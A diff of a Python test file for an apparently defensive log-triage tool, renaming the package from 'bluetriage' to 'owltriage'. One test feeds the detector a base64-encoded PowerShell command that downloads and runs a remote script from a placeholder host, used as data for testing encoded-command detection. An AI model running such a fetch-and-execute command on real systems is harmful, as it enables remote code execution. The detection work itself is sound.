@@ -6,13 +6,13 @@ from pathlib import Path
 
 import pytest
 
-from bluetriage import windows
-from bluetriage.defense import plan_blocks
-from bluetriage.detectors import analyze
-from bluetriage.intel import BadIPList
-from bluetriage.sources import detect_format, iter_events
+from owltriage import windows
+from owltriage.defense import plan_blocks
+from owltriage.detectors import analyze
+from owltriage.intel import BadIPList
+from owltriage.sources import detect_format, iter_events
 
-SAMPLES = Path(__file__).resolve().parent.parent / "bluetriage" / "resources" / "samples"
+SAMPLES = Path(__file__).resolve().parent.parent / "owltriage" / "resources" / "samples"
 WIN = SAMPLES / "windows_security.xml"
 
 
@@ -133,7 +133,7 @@ def test_evtx_without_optional_package_gives_install_hint(tmp_path, monkeypatch)
 
     monkeypatch.setattr(builtins, "__import__", no_evtx)
     result = analyze([fake])
-    assert any("pip install 'bluetriage[evtx]'" in w for w in result.warnings)
+    assert any("pip install 'owltriage[evtx]'" in w for w in result.warnings)
 
 
 def test_corrupt_evtx_is_a_warning():
@@ -156,6 +156,6 @@ def test_record_from_json_rejects_non_windows():
 
 def test_encoded_command_detection_on_utf16():
     encoded = base64.b64encode("Invoke-Expression (iwr http://x/y.ps1)".encode("utf-16-le")).decode()
-    from bluetriage.detectors import decode_base64_blobs
+    from owltriage.detectors import decode_base64_blobs
     [(token, decoded)] = decode_base64_blobs(f"powershell -enc {encoded}")
     assert decoded.startswith("Invoke-Expression")
